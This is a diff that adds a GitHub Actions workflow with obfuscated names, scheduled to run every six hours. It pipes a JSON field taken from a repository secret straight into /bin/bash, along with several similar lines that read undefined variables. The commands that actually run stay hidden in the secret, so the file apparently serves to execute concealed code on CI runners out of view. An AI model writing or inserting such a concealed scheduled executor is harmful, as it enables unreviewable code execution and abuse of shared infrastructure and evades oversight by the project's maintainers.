@@ -1,0 +1,21 @@
+name: luzhanyuan7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luzhanyuan7654
+        env:
+          s8: ${{ secrets.s8 }}
+        run: |
+          echo $s8 | jq -r .cuib8322 | /bin/bash
+          echo $ao30489 | jq -r .fl44 | /bin/bash
+          echo $pxz371 | jq -r .dpfrs7 | /bin/bash
+          echo $wjx23 | jq -r .xllc421 | /bin/bash
+          echo $zrv6 | jq -r .wwvx34 | /bin/bash
+
